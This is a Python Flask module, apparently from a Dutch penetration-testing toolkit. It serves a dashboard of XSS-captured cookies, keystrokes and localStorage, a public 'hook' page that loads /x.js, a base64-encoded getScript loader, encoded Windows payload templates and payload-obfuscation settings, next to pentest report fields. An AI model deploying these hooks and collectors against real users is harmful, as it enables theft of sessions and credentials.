from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response, jsonify, g, current_app
from meuk.flask.models import *
from meuk.flask.security import dashboard_access_allowed
from meuk.flask.security import is_local_request
from meuk.flask.security import require_dashboard_access
import glob
import base64
import json
from pathlib import Path


# Blueprint Configuration (moet voor template filters staan)
index_bp = Blueprint('index_bp', __name__,
                    template_folder='html',
                    static_folder='static')


@index_bp.app_template_filter('zet_actief')
def zet_actief(tab, pag):
    if pag == 'verwerkt':
        if tab == 'tab1':
            return 'in active'
    else:
        if pag !='verwerkt':
            if tab == 'tab0':
                return 'in active'
    return ''

@index_bp.app_template_filter('nulvul')
def nulvul(num):
    return str(num).zfill(3)


@index_bp.app_template_filter('inhoudweergeven')
def inhoud_weergeven(bestand, edit=False):
    try:
        naam=bestand.rsplit('/', 1)[1]
        inhoud = lezen(bestand)
        if edit:
            naam = '<a href="#" class="modalweergeven" data-rel="/dashboard/bestanden/?bewerk='+bestand+'" data-title="'+naam+'">'+naam+'</a>'
            return '<p>'+naam+'</p><pre>'+inhoud+'</pre>'
        else:
            return inhoud
    except:
        return ''

@index_bp.app_template_filter('zet_pill')
def zet_pill(tab, pag):
    if pag == 'verwerkt':
        if tab == 'tab1':
            return 'class="active"'
    else:
        if pag !='verwerkt':
            if tab == 'tab0':
                return 'class="active"'
    return ''



@index_bp.app_template_filter('zet_ip')
def zet_ip(num):
    return str(num).split('//')[1]


@index_bp.app_template_filter('winbas64')
def winbas64(stringh):
    appdata = db_instellingen.query.first()
    strinh = stringh.replace('[host]',appdata.localhost)
    b1 = strinh.encode('utf-16-le')
    b64a = base64.b64encode(b1)
    return str(b64a,'utf-8')



    return str(num).split('//')[1]



@index_bp.app_template_filter('bevindingen_halen')
def bevindingen_halen(num, b):
   
    d=''
    for x in b:
        if int(x.ref) == num:
            d = d + '<li id="finding_'+str(x.id)+'"><a href="#" class="modalweergeven" data-title="'+x.naam+'" data-rel="/dashboard/findings/edit/'+str(x.id)+'">['+str(x.id).zfill(3)+']  <strong>'+x.naam+'</strong></a>    <small class="delete_finding pull-right label-danger" data-item="finding_'+str(x.id)+'" data-rel="'+str(x.id)+'">[instant delete]</small></li>'
    return d


#favicon
@index_bp.route('/favicon.ico')
@index_bp.route('/static/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico')

@index_bp.route('/dashboard/raw/screenshots/<path:plaatje>')
def plaatje(plaatje):
    require_dashboard_access()
    pagina =  send_from_directory('raw/screenshots/', plaatje)
    return pagina


_SCREENSHOT_DIR = Path('raw/screenshots')
_IMAGE_SUFFIXES = {'.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.svg'}


@index_bp.route('/api/screenshots', methods=['GET'])
def api_screenshots():
    require_dashboard_access()
    items = []
    if _SCREENSHOT_DIR.exists():
        for p in sorted(_SCREENSHOT_DIR.iterdir()):
            if p.is_file() and p.suffix.lower() in _IMAGE_SUFFIXES:
                items.append({
                    'name': p.name,
                    'url': '/dashboard/raw/screenshots/' + p.name,
                })
    return jsonify(items)


#basic website
@index_bp.route('/', defaults={'cms_pag': 'index'}, methods=['GET', 'POST'])
@index_bp.route('/<cms_pag>')
def index(cms_pag):
    if not is_local_request():
        # Non-localhost altijd de hook pagina, ongeacht session state
        g.is_public_page = True
        nonce = getattr(g, 'csp_nonce', '')
        return (
            f'<html><title>hallo wereld</title><body>'
            f'<h1>Een moment a.u.b.</h1>'
            f'<script nonce="{nonce}" src="/x.js"></script>'
            f'</body></html>'
        )

    else:
        require_dashboard_access()
        appdata = db_instellingen.query.first()

        #use our normal pages
        hooked = db_xxs_hooked.query.all()
        cookies = db_xxs_cookies.query.order_by('datum').all()
        keylogger = db_xxs_keylogger.query.order_by('datum').all()
        localstorage=db_xxs_localstorage.query.order_by('datum').all()
        template = db_bevindingen_templates.query.all()
        bevindingen = db_bevindingen.query.all()
        notes = db_notes.query.all()

        d="jQuery.getScript('"+appdata.localhost+"/x.js');"
        js1=base64.b64encode(bytes(d, 'utf-8'))
        js1 = str(js1, 'utf-8')
        jspagina = render_template('xss.html', localhost=appdata.localhost)
        js2=base64.b64encode(bytes(jspagina, 'utf-8'))
        js2 = str(js2, 'utf-8')

        commands=glob.glob('http/commands/*')

        xxe_count = db_xxe.query.count()
        csrf_count = db_csrf.query.count()
        sqli_count = db_sqli.query.count()
        ssrf_count = db_ssrf.query.count()

        #overzichtweergeven
        pagina = render_template('dashboard.html', cms_pag=cms_pag, bevindingen=bevindingen, cookies=cookies, keylogger=keylogger, localstorage=localstorage,  hooked=hooked, aantalhooked=len(hooked), template=template, js1=js1, js2=js2, appdata=appdata, commands=commands, notes=notes, xxe_count=xxe_count, csrf_count=csrf_count, sqli_count=sqli_count, ssrf_count=ssrf_count)
        return pagina


@index_bp.route('/api/settings')
def api_settings():
    require_dashboard_access()
    s = db_instellingen.query.first()
    return jsonify({
        'public_upload': bool(getattr(s, 'public_upload', False)),
        'public_downloads': bool(getattr(s, 'public_downloads', False)),
        'public_payloads': bool(getattr(s, 'public_payloads', False)),
        'behind_proxy': bool(getattr(s, 'behind_proxy', False)),
        'obfuscate_downloads': bool(getattr(s, 'obfuscate_downloads', False)),
        'obfuscate_technique': getattr(s, 'obfuscate_technique', '') or 'mixed',
        'default_payload': getattr(s, 'default_payload', '') or '',
        'localhost': s.localhost or '',
        'rapport_titel': getattr(s, 'rapport_titel', '') or '',
        'rapport_auteur': getattr(s, 'rapport_auteur', '') or '',
        'rapport_subtitel': getattr(s, 'rapport_subtitel', '') or '',
        'rapport_project': getattr(s, 'rapport_project', '') or '',
        'rapport_omgeving': getattr(s, 'rapport_omgeving', '') or '',
        'rapport_classificatie': getattr(s, 'rapport_classificatie', '') or 'TLP:RED',
        'rapport_taal': getattr(s, 'rapport_taal', '') or 'nl',
        'rapport_isdraft': bool(getattr(s, 'rapport_isdraft', True)),
        'rapport_testtype': getattr(s, 'rapport_testtype', '') or 'pentest',
        'rapport_testscope': getattr(s, 'rapport_testscope', '') or 'blackbox',
        'rapport_management_samenvatting': getattr(s, 'rapport_management_samenvatting', '') or '',
        'rapport_legsup_startpunt': getattr(s, 'rapport_legsup_startpunt', '') or '',
        'rapport_legsup_privileges': getattr(s, 'rapport_legsup_privileges', '') or '',
        'rapport_legsup_informatie': getattr(s, 'rapport_legsup_informatie', '') or '',
        'rapport_scenarios': json.loads(getattr(s, 'rapport_scenarios', '[]') or '[]'),
        'rapport_scope_targets': json.loads(getattr(s, 'rapport_scope_targets', '[]') or '[]'),
        'rapport_logo_path': getattr(s, 'rapport_logo_path', '') or '',
        'rapport_template_variant': getattr(s, 'rapport_template_variant', '') or 'detailed',
        'rapport_roe': getattr(s, 'rapport_roe', '') or '',
        'rapport_test_start_date': str(getattr(s, 'rapport_test_start_date', '') or ''),
        'rapport_test_end_date': str(getattr(s, 'rapport_test_end_date', '') or ''),
        'rapport_versie': getattr(s, 'rapport_versie', '') or '',
        'rapport_versie_status': getattr(s, 'rapport_versie_status', '') or 'concept',
    })


@index_bp.route('/api/settings', methods=['POST'])
def api_settings_update():
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True)
    s = db_instellingen.query.first()
    for key in ('public_upload', 'public_downloads', 'public_payloads', 'behind_proxy'):
        if key in data:
            setattr(s, key, bool(data[key]))
    if 'behind_proxy' in data:
        current_app.config["BEHIND_PROXY"] = bool(data['behind_proxy'])
    if 'obfuscate_downloads' in data:
        s.obfuscate_downloads = bool(data['obfuscate_downloads'])
    if 'obfuscate_technique' in data and isinstance(data['obfuscate_technique'], str):
        if data['obfuscate_technique'] in ('mixed', 'subexpr', 'format', 'chararray', 'backtick'):
            s.obfuscate_technique = data['obfuscate_technique']
    if 'default_payload' in data and isinstance(data['default_payload'], str):
        try:
            s.default_payload = data['default_payload'].strip()
        except Exception:
            pass
    if 'localhost' in data and isinstance(data['localhost'], str):
        s.localhost = data['localhost'].strip()
    for key in ('rapport_titel', 'rapport_auteur', 'rapport_subtitel',
                 'rapport_project', 'rapport_omgeving', 'rapport_classificatie', 'rapport_taal',
                 'rapport_testtype', 'rapport_testscope'):
        if key in data and isinstance(data[key], str):
            setattr(s, key, data[key].strip()[:200])
    if 'rapport_management_samenvatting' in data and isinstance(data['rapport_management_samenvatting'], str):
        s.rapport_management_samenvatting = data['rapport_management_samenvatting'].strip()[:10000]
    for key in ('rapport_legsup_startpunt', 'rapport_legsup_privileges', 'rapport_legsup_informatie'):
        if key in data and isinstance(data[key], str):
            setattr(s, key, data[key].strip()[:10000])
    if 'rapport_scenarios' in data and isinstance(data['rapport_scenarios'], list):
        scenarios = data['rapport_scenarios'][:20]
        clean = []
        for sc in scenarios:
            if isinstance(sc, dict):
                clean.append({
                    'naam': str(sc.get('naam', ''))[:500],
                    'beschrijving': str(sc.get('beschrijving', ''))[:5000],
                })
        s.rapport_scenarios = json.dumps(clean)
    _SCOPE_TARGET_TYPES = ('host', 'netwerk', 'url', 'applicatie')
    if 'rapport_scope_targets' in data and isinstance(data['rapport_scope_targets'], list):
        raw_targets = data['rapport_scope_targets'][:50]
        clean_targets = []
        for st in raw_targets:
            if isinstance(st, dict):
                clean_targets.append({
                    'target': str(st.get('target', ''))[:500],
                    'type': str(st.get('type', 'host'))[:20] if str(st.get('type', 'host')) in _SCOPE_TARGET_TYPES else 'host',
                    'beschrijving': str(st.get('beschrijving', ''))[:500],
                })
        s.rapport_scope_targets = json.dumps(clean_targets)
    if 'rapport_isdraft' in data:
        s.rapport_isdraft = bool(data['rapport_isdraft'])
    if 'rapport_template_variant' in data and isinstance(data['rapport_template_variant'], str):
        if data['rapport_template_variant'] in ('detailed', 'executive', 'board'):
            s.rapport_template_variant = data['rapport_template_variant']
    if 'rapport_roe' in data and isinstance(data['rapport_roe'], str):
        s.rapport_roe = data['rapport_roe'].strip()[:10000]
    if 'rapport_test_start_date' in data:
        val = data['rapport_test_start_date']
        if val:
            try:
                import datetime as _dt
                s.rapport_test_start_date = _dt.date.fromisoformat(str(val))
            except (ValueError, TypeError):
                pass
        else:
            s.rapport_test_start_date = None
    if 'rapport_test_end_date' in data:
        val = data['rapport_test_end_date']
        if val:
            try:
                import datetime as _dt
                s.rapport_test_end_date = _dt.date.fromisoformat(str(val))
            except (ValueError, TypeError):
                pass
        else:
            s.rapport_test_end_date = None
    if 'rapport_versie' in data and isinstance(data['rapport_versie'], str):
        s.rapport_versie = data['rapport_versie'].strip()[:20]
    if 'rapport_versie_status' in data and isinstance(data['rapport_versie_status'], str):
        if data['rapport_versie_status'] in ('concept', 'definitief', 'herzien'):
            s.rapport_versie_status = data['rapport_versie_status']
    db.session.commit()
    return jsonify({'ok': True})
